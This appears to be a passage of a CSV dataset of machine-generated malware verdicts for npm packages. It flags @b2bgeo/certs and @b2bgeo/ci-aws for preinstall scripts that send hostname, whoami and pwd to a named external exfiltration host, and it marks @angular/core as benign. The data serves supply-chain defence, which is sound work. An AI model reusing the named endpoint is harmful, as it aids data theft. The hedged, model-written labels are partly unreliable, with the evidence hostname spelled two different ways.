+This analysis is based on the provided code snippets and structural analysis context. The confidence score is 0.8, indicating that the evidence is clear and reliable. The risk vector includes ""credential_theft"" and ""sensitive_data_collection"" as these behaviors are identified in the analysis.","{""package_name"": ""@b2bgeo/certs"", ""version"": ""13.3.8"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""The package has a preinstall script that sends HTTP requests with sensitive information"", ""details"": ""The package @b2bgeo/certs has a preinstall script that sends HTTP requests to an external server with sensitive information such as the package name, version, hostname, whoami, pwd, and a custom message"", ""confidence"": 0.8, ""evidence_apis"": [""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR8020F364""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:56:41.303241""}"
+@b2bgeo/ci-aws,13.3.7,2025-12-23T23:57:05.349687,DeepSeek-Coder-6.7B-Instruct,v2.0,1,network_reconnaissance,"[""network_reconnaissance""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/ci-aws"". The script is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd.
+
+This could potentially be a form of network reconnaissance or system reconnaissance, as it's gathering information about the system it's being installed on. However, without more context or evidence, it's hard to say for certain.
+
+Here's a basic JSON response based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""network_reconnaissance"",
+      ""summary"": ""The package is making an HTTP request to an external server during the installation process"",
+      ""details"": ""The package is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd"",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""network_reconnaissance""
+  ]
+}
+```
+
+This response is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@b2bgeo/ci-aws"", ""version"": ""13.3.7"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""network_reconnaissance"", ""summary"": ""The package is making an HTTP request to an external server during the installation process"", ""details"": ""The package is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd"", ""confidence"": 0.7, ""evidence_apis"": [""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR130349E9""}], ""risk_vector"": [""network_reconnaissance""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:57:05.349415""}"
+@b2bgeo/ci-aws,13.3.8,2025-12-23T23:57:30.505902,DeepSeek-Coder-6.7B-Instruct,v2.0,1,network_reconnaissance,"[""network_reconnaissance""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script for the npm package ""@b2bgeo/ci-aws"". The script is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd.
+
+This could potentially be a form of network reconnaissance or system reconnaissance, as it's gathering information about the system it's being installed on. However, without more context or evidence, it's hard to say for certain.
+
+Here's a basic JSON response based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""network_reconnaissance"",
+      ""summary"": ""The package is sending network reconnaissance requests to an external server."",
+      ""details"": ""The package is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""network_reconnaissance""
+  ]
+}
+```
+
+This response is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@b2bgeo/ci-aws"", ""version"": ""13.3.8"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""network_reconnaissance"", ""summary"": ""The package is sending network reconnaissance requests to an external server."", ""details"": ""The package is making an HTTP request to an external server with several headers and data, including the package name, version, hostname, whoami, and pwd."", ""confidence"": 0.7, ""evidence_apis"": [""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRA240BD89""}], ""risk_vector"": [""network_reconnaissance""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:57:30.505631""}"
+@angular/core,16.2.6,2025-12-23T23:57:44.548390,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""package_name"": ""@angular/core"", ""version"": ""16.2.6"", ""label"": ""benign"", ""behaviors"": [], ""risk_vector"": [], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:57:44.548106""}"
